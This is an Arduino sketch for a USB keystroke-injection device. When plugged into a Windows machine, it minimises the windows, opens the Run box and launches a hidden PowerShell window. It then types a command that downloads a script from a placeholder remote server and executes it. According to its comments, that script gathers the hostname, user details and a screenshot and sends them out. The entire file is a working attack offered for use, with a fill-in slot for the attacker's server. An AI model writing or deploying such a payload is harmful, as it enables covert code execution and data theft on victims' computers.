#include <Keyboard.h> 

// Init function
void setup()
{
  // Begining the stream
  Keyboard.begin();

  // Waiting 500ms for init
  delay(500);

  // Ducky Script to gather hostname, user info, screenshot and send as a JSON POST request
  delay(1000);

  // Minimize all windows
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(100);
  Keyboard.releaseAll();

  delay(500);

  // Open run box
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("powershell -WindowStyle Hidden");

  typeKey(KEY_RETURN);

  delay(1000);

  // PowerShell Script to gather information, take a screenshot and send POST request
  Keyboard.print("$scriptUrl = 'http://{{your-remote-server-ip}}:5000/uploads/run.ps1'; Invoke-Expression -Command (Invoke-RestMethod -Uri $scriptUrl)");

  typeKey(KEY_RETURN);

}

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

// Unused
void loop() {}
